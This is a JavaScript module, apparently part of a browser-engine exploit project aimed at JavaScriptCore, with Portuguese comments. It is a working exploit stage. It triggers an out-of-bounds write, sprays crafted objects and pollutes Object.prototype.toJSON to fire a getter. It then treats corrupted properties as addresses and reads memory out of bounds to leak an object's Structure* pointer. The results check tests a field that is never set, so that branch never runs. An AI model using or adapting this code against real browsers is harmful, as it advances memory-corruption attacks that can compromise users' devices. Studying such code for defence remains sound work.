// js/script3/testGetterInspectsCorruptedProps.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_NAME = "AAAA_GetterInspectOwnProps";
let getter_inspection_results = {};

class MyComplexObjectWithDiverseProps {
    constructor(id) {
        this.id_str = `ComplexObjLeakTest-${id}`; // String
        this.marker_num = 0xFEEDBEEF;           // Number
        this.value_A_num = 12345678;             // Number, potencial alvo para virar ponteiro (low part)
        this.value_B_num = 87654321;             // Number, potencial alvo para virar ponteiro (high part)
        this.sub_object = { a: 1, b: "sub" };    // Object
        this.sub_array = [100, 200, 300];        // Array
        this.bool_true = true;                   // Boolean
        this.null_val = null;                    // Null
    }
}

Object.defineProperty(MyComplexObjectWithDiverseProps.prototype, GETTER_NAME, {
    get: function() {
        const GETTER_FNAME = "MyComplexObjectWithDiverseProps.Getter";
        logS3(`!!!! GETTER '${GETTER_NAME}' FOI CHAMADO !!!! (this.id_str: ${this.id_str})`, "vuln", GETTER_FNAME);
        this.marker_num = 0x600D600D; // Indicar que o getter foi chamado

        getter_inspection_results = {
            id_in_getter: this.id_str,
            properties_inspected: {},
            potential_pointers_found: [],
            structure_ptr_of_this_leaked: "N/A",
            error: null
        };

        const ownProps = Object.getOwnPropertyNames(this);
        logS3(`   [${GETTER_FNAME}] Inspecionando ${ownProps.length} propriedades próprias de 'this':`, "info", GETTER_FNAME);

        for (const propName of ownProps) {
            let prop_val_str = "N/A";
            let prop_type = "N/A";
            let is_potential_ptr = false;
            let potential_ptr_val_adv64 = null;

            try {
                const val = this[propName];
                prop_type = typeof val;
                prop_val_str = String(val).substring(0, 60);

                if (isAdvancedInt64Object(val)) { // Se alguma propriedade virou um AdvancedInt64
                    is_potential_ptr = true;
                    potential_ptr_val_adv64 = val;
                    prop_val_str = val.toString(true);
                } else if (prop_type === 'number' && (val > 0x10000000 || val < -0x10000000)) { // Heurística para ponteiro em número JS
                    is_potential_ptr = true;
                    potential_ptr_val_adv64 = AdvancedInt64.fromNumber(val); // Pode perder precisão para > 53 bits
                    prop_val_str = `Number ${toHex(val)} (as Adv64: ${potential_ptr_val_adv64.toString(true)})`;
                }

                logS3(`     Prop: '${propName}', Type: ${prop_type}, Value: ${prop_val_str}`, "info", GETTER_FNAME);
                getter_inspection_results.properties_inspected[propName] = { type: prop_type, value_str: prop_val_str, is_potential_ptr: is_potential_ptr };

                if (is_potential_ptr && potential_ptr_val_adv64) {
                    logS3(`       !!!! POTENCIAL PONTEIRO ENCONTRADO em this.${propName}: ${potential_ptr_val_adv64.toString(true)} !!!!`, "leak", GETTER_FNAME);
                    getter_inspection_results.potential_pointers_found.push({
                        prop: propName,
                        value: potential_ptr_val_adv64.toString(true)
                    });

                    // TENTATIVA DE EXPLORAÇÃO: Assumir que este ponteiro é addrof(this)
                    // E tentar ler o Structure* de 'this'
                    if (propName === 'value_A_num' || propName === 'value_B_num') { // Exemplo: se value_A ou value_B virou addrof(this)
                        logS3(`         Assumindo que this.${propName} (${potential_ptr_val_adv64.toString(true)}) é addrof(this). Tentando ler Structure*...`, "warn", GETTER_FNAME);
                        try {
                            const structure_ptr_offset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16);
                            const address_of_structure_ptr_field = potential_ptr_val_adv64.add(new AdvancedInt64(structure_ptr_offset));
                            logS3(`           Endereço calculado do campo Structure*: ${address_of_structure_ptr_field.toString(true)}`, "info", GETTER_FNAME);

                            const actual_structure_ptr = oob_read_absolute(address_of_structure_ptr_field, 8);
                            getter_inspection_results.structure_ptr_of_this_leaked = actual_structure_ptr.toString(true);
                            logS3(`         !!!! Structure* de 'this' (lido de ${address_of_structure_ptr_field.toString(true)}): ${actual_structure_ptr.toString(true)} !!!!`, "critical", GETTER_FNAME);
                            document.title = "SUCCESS: Structure* Leaked!";
                        } catch (e_read_struct) {
                            logS3(`         ERRO ao tentar ler Structure* usando ${propName} como base: ${e_read_struct.message}`, "error", GETTER_FNAME);
                        }
                    }
                }
            } catch (e_access) {
                logS3(`     ERRO ao acessar/processar this.${propName}: ${e_access.name} - ${e_access.message}`, "error", GETTER_FNAME);
                getter_inspection_results.properties_inspected[propName] = { error: `${e_access.name}: ${e_access.message}` };
            }
        }
        return "getter_inspect_props_done";
    },
    configurable: true,
    enumerable: true
});

// toJSON que usa for...in, para ser colocada em Object.prototype para acionar o getter
export function toJSON_TriggerGetterViaForInForLeakTest() {
    const FNAME_toJSON = "toJSON_TriggerGetterViaForInForLeakTest";
    let returned_payload = { _variant_: FNAME_toJSON, id_at_entry: String(this?.id_str || "N/A_toJSON") };
    let iter_count = 0;
    try {
        for (const prop in this) {
            iter_count++;
            if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObjectWithDiverseProps.prototype.hasOwnProperty(prop)) {
                if (typeof this[prop] !== 'function' || prop === GETTER_NAME) { // Tocar no getter e props simples
                    returned_payload[prop] = this[prop];
                }
            }
            if (iter_count > 100) break;
        }
    } catch (e) { returned_payload.error_in_loop = `${e.name}: ${e.message}`; }
    if (iter_count > 0) returned_payload.iterations = iter_count;
    return returned_payload;
}

export async function executeGetterInspectsCorruptedPropsTest() {
    const FNAME_TEST = "executeGetterInspectsCorruptedPropsTest";
    logS3(`--- Iniciando Teste: Getter Inspeciona Props Corrompidas para Leaks de Ponteiro ---`, "test", FNAME_TEST);
    document.title = `Getter Inspects Corrupted Props`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST); return;
    }

    // 1. (Opcional) Construir um JSArrayBuffer Falso para referência ou se a exploração futura precisar
    const FAKE_JSARRAYBUFFER_CONTENT_OFFSET = 0x300;
    // ... (código de construção do fake AB como no teste anterior, se quiser mantê-lo para contexto) ...
    // logS3(`1. JSArrayBuffer Falso construído em oob_content[${toHex(FAKE_JSARRAYBUFFER_CONTENT_OFFSET)}] (para referência).`, "info", FNAME_TEST);

    // 2. Pulverizar MyComplexObjectWithDiverseProps
    const spray_count = 5; // Começar com poucos para observação detalhada
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectWithDiverseProps...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectWithDiverseProps(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Realizar a corrupção OOB "gatilho"
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_trigger = 0xFFFFFFFF; // O valor que causou instabilidade/getter antes
    logS3(`3. Escrevendo valor trigger ${toHex(value_to_write_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, value_to_write_trigger, 4);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Poluir Object.prototype.toJSON e tentar acionar o getter
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected_stringify = false;

    getter_inspection_results = {}; // Resetar resultados do getter

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerGetterViaForInForLeakTest,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_TriggerGetterViaForInForLeakTest.name}.`, "info", FNAME_TEST);

        const obj_to_probe = sprayed_objects[0]; // Testar o primeiro
        logS3(`5. Sondando objeto ${obj_to_probe.id_str}... ESPERANDO ACIONAMENTO DO GETTER.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id_str} (GetterInspectsProps)`;
        try {
            const stringifyResult = JSON.stringify(obj_to_probe);
            logS3(`   JSON.stringify(${obj_to_probe.id_str}) completou. Retorno toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);

        } catch (e_str) {
            logS3(`   !!!! ERRO AO STRINGIFY ${obj_to_probe.id_str} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            problem_detected_stringify = true;
            document.title = `ERROR Stringify ${obj_to_probe.id_str}`;
        }
    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected_stringify = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Analisar resultados do getter
    if (getter_inspection_results.getter_this_id) {
        logS3("--- RESULTADOS DA INSPEÇÃO NO GETTER ---", "test", FNAME_TEST);
        logS3(JSON.stringify(getter_inspection_results, null, 2), "leak", FNAME_TEST);
        if (getter_inspection_results.structure_ptr_of_this_leaked !== "N/A") {
            logS3("   !!!! SUCESSO POTENCIAL: Structure* de 'this' pode ter sido vazado !!!!", "critical", FNAME_TEST);
        } else if (getter_inspection_results.potential_pointers_found && getter_inspection_results.potential_pointers_found.length > 0) {
            logS3("   Potenciais ponteiros encontrados nas propriedades, mas Structure* de 'this' não foi lido diretamente assumindo que um deles era addrof(this).", "warn", FNAME_TEST);
        } else {
            logS3("   Getter acionado, mas nenhuma propriedade parece ter sido corrompida para um ponteiro óbvio.", "info", FNAME_TEST);
        }
    } else if (!problem_detected_stringify) {
        logS3("Getter não foi acionado, mas nenhum erro explícito ocorreu durante o stringify.", "warn", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Getter Inspeciona Props Corrompidas CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("SUCCESS")) {
        // Manter
    } else if (problem_detected_stringify || (getter_inspection_results.error)) {
        // Manter se já houve um erro
    } else {
        document.title = `GetterInspectsProps Done`;
    }
}
